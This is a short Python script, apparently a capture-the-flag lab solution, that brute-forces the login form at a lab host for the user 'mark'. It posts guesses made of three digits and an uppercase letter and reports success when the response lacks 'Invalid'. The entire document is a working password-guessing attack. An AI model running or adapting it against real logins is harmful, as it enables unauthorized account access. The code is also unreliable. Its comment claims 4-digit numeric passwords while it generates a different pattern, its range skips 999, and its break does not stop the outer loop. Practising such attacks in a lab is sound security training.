import requests
import string
url = "http://python.thm/labs/lab1/index.php"

username = "mark"

# Generating 4-digit numeric passwords (0000-9999)

letters = list(string.ascii_uppercase)
def brute_force():
    for passwords in range(0,999):
        print(passwords)
        for password in letters:
            passe = str(passwords).zfill(3) + password
            data = {"username": username, "password": passe}
            response = requests.post(url, data=data)
            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{passe}")
                break
            else:
                print(f"[-] Attempted: {passe}")

brute_force()
